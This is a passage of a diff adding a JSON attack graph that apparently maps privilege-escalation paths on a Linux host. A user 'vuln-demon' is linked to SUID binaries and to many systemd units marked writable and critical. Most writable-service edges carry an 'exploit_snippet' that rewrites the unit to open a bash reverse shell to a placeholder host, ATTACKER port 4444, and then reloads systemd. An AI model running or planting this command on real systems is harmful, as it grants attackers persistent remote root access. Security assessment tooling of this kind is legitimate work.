+    {
+      "id": "service:systemd-binfmt.service",
+      "type": "service",
+      "label": "systemd-binfmt.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-binfmt.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-boot-system-token.service",
+      "type": "service",
+      "label": "systemd-boot-system-token.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-boot-system-token.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-hwdb-update.service",
+      "type": "service",
+      "label": "systemd-hwdb-update.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-hwdb-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-journal-flush.service",
+      "type": "service",
+      "label": "systemd-journal-flush.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-journal-flush.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-journald.service",
+      "type": "service",
+      "label": "systemd-journald.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-journald.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-machine-id-commit.service",
+      "type": "service",
+      "label": "systemd-machine-id-commit.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-machine-id-commit.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-modules-load.service",
+      "type": "service",
+      "label": "systemd-modules-load.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-modules-load.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-random-seed.service",
+      "type": "service",
+      "label": "systemd-random-seed.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-random-seed.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-sysctl.service",
+      "type": "service",
+      "label": "systemd-sysctl.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-sysctl.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-sysusers.service",
+      "type": "service",
+      "label": "systemd-sysusers.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-sysusers.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-tmpfiles-setup-dev.service",
+      "type": "service",
+      "label": "systemd-tmpfiles-setup-dev.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup-dev.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-tmpfiles-setup.service",
+      "type": "service",
+      "label": "systemd-tmpfiles-setup.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-tmpfiles-setup.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-udev-trigger.service",
+      "type": "service",
+      "label": "systemd-udev-trigger.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-udev-trigger.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-udevd.service",
+      "type": "service",
+      "label": "systemd-udevd.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-udevd.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:systemd-update-utmp.service",
+      "type": "service",
+      "label": "systemd-update-utmp.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/sysinit.target.wants/systemd-update-utmp.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:fwupd-offline-update.service",
+      "type": "service",
+      "label": "fwupd-offline-update.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/system-update.target.wants/fwupd-offline-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:packagekit-offline-update.service",
+      "type": "service",
+      "label": "packagekit-offline-update.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/system-update.target.wants/packagekit-offline-update.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:udev.service",
+      "type": "service",
+      "label": "udev.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/udev.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    },
+    {
+      "id": "service:x11-common.service",
+      "type": "service",
+      "label": "x11-common.service",
+      "properties": {
+        "path": "/usr/lib/systemd/system/x11-common.service",
+        "run_as": "root",
+        "state": "unknown"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "id": "e1",
+      "source": "user:syslog",
+      "target": "group:adm",
+      "type": "MemberOf",
+      "risk": "low",
+      "properties": {}
+    },
+    {
+      "id": "e2",
+      "source": "user:syslog",
+      "target": "group:tty",
+      "type": "MemberOf",
+      "risk": "low",
+      "properties": {}
+    },
+    {
+      "id": "e3",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/bsd-write",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/bsd-write"
+      }
+    },
+    {
+      "id": "e4",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/chage",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/chage"
+      }
+    },
+    {
+      "id": "e5",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/chfn",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/chfn"
+      }
+    },
+    {
+      "id": "e6",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/chsh",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/chsh"
+      }
+    },
+    {
+      "id": "e7",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/crontab",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/crontab"
+      }
+    },
+    {
+      "id": "e8",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/expiry",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/expiry"
+      }
+    },
+    {
+      "id": "e9",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/fusermount",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/fusermount"
+      }
+    },
+    {
+      "id": "e10",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/gpasswd",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/gpasswd"
+      }
+    },
+    {
+      "id": "e11",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/mount",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/mount"
+      }
+    },
+    {
+      "id": "e12",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/newgrp",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/newgrp"
+      }
+    },
+    {
+      "id": "e13",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/passwd",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/passwd"
+      }
+    },
+    {
+      "id": "e14",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/pkexec",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/pkexec"
+      }
+    },
+    {
+      "id": "e15",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/ssh-agent",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/ssh-agent"
+      }
+    },
+    {
+      "id": "e16",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/su",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/su"
+      }
+    },
+    {
+      "id": "e17",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/sudo",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/sudo"
+      }
+    },
+    {
+      "id": "e18",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/umount",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/umount"
+      }
+    },
+    {
+      "id": "e19",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/bin/wall",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/bin/wall"
+      }
+    },
+    {
+      "id": "e20",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/sbin/pam_extrausers_chkpwd",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/sbin/pam_extrausers_chkpwd"
+      }
+    },
+    {
+      "id": "e21",
+      "source": "user:vuln-demon",
+      "target": "binary:/usr/sbin/unix_chkpwd",
+      "type": "SuidBinary",
+      "risk": "medium",
+      "properties": {
+        "path": "/usr/sbin/unix_chkpwd"
+      }
+    },
+    {
+      "id": "e22",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.seeded.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/cloud-final.service.wants/snapd.seeded.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/cloud-final.service.wants/snapd.seeded.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e23",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.resolve1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/dbus-org.freedesktop.resolve1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/dbus-org.freedesktop.resolve1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e24",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.thermald.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/dbus-org.freedesktop.thermald.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/dbus-org.freedesktop.thermald.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e25",
+      "source": "user:vuln-demon",
+      "target": "service:dbus-org.freedesktop.timesync1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/dbus-org.freedesktop.timesync1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/dbus-org.freedesktop.timesync1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e26",
+      "source": "user:vuln-demon",
+      "target": "service:e2scrub_reap.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/default.target.wants/e2scrub_reap.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/default.target.wants/e2scrub_reap.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e27",
+      "source": "user:vuln-demon",
+      "target": "service:grub-initrd-fallback.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/emergency.target.wants/grub-initrd-fallback.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/emergency.target.wants/grub-initrd-fallback.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e28",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.system-shutdown.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/final.target.wants/snapd.system-shutdown.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/final.target.wants/snapd.system-shutdown.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e29",
+      "source": "user:vuln-demon",
+      "target": "service:getty@tty1.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/getty.target.wants/getty@tty1.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/getty.target.wants/getty@tty1.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e30",
+      "source": "user:vuln-demon",
+      "target": "service:accounts-daemon.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/graphical.target.wants/accounts-daemon.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/graphical.target.wants/accounts-daemon.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e31",
+      "source": "user:vuln-demon",
+      "target": "service:iscsi.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/iscsi.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/iscsi.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e32",
+      "source": "user:vuln-demon",
+      "target": "service:analyzer.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/analyzer.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/analyzer.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e33",
+      "source": "user:vuln-demon",
+      "target": "service:atd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/atd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/atd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e34",
+      "source": "user:vuln-demon",
+      "target": "service:console-setup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/console-setup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/console-setup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e35",
+      "source": "user:vuln-demon",
+      "target": "service:cron.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/cron.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/cron.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e36",
+      "source": "user:vuln-demon",
+      "target": "service:dmesg.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/dmesg.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/dmesg.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e37",
+      "source": "user:vuln-demon",
+      "target": "service:grub-initrd-fallback.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/grub-initrd-fallback.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/grub-initrd-fallback.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e38",
+      "source": "user:vuln-demon",
+      "target": "service:irqbalance.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/irqbalance.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/irqbalance.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e39",
+      "source": "user:vuln-demon",
+      "target": "service:lxd-agent-9p.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/lxd-agent-9p.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/lxd-agent-9p.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e40",
+      "source": "user:vuln-demon",
+      "target": "service:lxd-agent.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/lxd-agent.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/lxd-agent.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e41",
+      "source": "user:vuln-demon",
+      "target": "service:networkd-dispatcher.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/networkd-dispatcher.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/networkd-dispatcher.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e42",
+      "source": "user:vuln-demon",
+      "target": "service:networking.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/networking.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/networking.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e43",
+      "source": "user:vuln-demon",
+      "target": "service:ondemand.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/ondemand.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/ondemand.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e44",
+      "source": "user:vuln-demon",
+      "target": "service:open-vm-tools.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/open-vm-tools.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/open-vm-tools.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e45",
+      "source": "user:vuln-demon",
+      "target": "service:pollinate.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/pollinate.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/pollinate.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e46",
+      "source": "user:vuln-demon",
+      "target": "service:rsync.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/rsync.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/rsync.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e47",
+      "source": "user:vuln-demon",
+      "target": "service:rsyslog.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/rsyslog.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/rsyslog.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e48",
+      "source": "user:vuln-demon",
+      "target": "service:secureboot-db.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/secureboot-db.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/secureboot-db.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e49",
+      "source": "user:vuln-demon",
+      "target": "service:snap.lxd.activate.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snap.lxd.activate.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snap.lxd.activate.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e50",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.apparmor.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.apparmor.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.apparmor.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e51",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.autoimport.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.autoimport.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.autoimport.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e52",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.core-fixup.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.core-fixup.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.core-fixup.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e53",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.recovery-chooser-trigger.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.recovery-chooser-trigger.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.recovery-chooser-trigger.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e54",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.seeded.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.seeded.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.seeded.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e55",
+      "source": "user:vuln-demon",
+      "target": "service:snapd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/snapd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/snapd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e56",
+      "source": "user:vuln-demon",
+      "target": "service:ssh.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/ssh.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/ssh.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e57",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-networkd.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/systemd-networkd.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/systemd-networkd.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e58",
+      "source": "user:vuln-demon",
+      "target": "service:systemd-resolved.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/systemd-resolved.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/systemd-resolved.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e59",
+      "source": "user:vuln-demon",
+      "target": "service:thermald.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/thermald.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/thermald.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e60",
+      "source": "user:vuln-demon",
+      "target": "service:ua-reboot-cmds.service",
+      "type": "WritableService",
+      "risk": "critical",
+      "properties": {
+        "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i \u003e\u0026 /dev/tcp/ATTACKER/4444 0\u003e\u00261' \u003e /etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service \u0026\u0026 systemctl daemon-reload",
+        "path": "/etc/systemd/system/multi-user.target.wants/ua-reboot-cmds.service",
+        "writable_by": "group"
+      }
+    },
+    {
+      "id": "e61",
+      "source": "user:vuln-demon",
+      "target": "service:vsftpd.service",
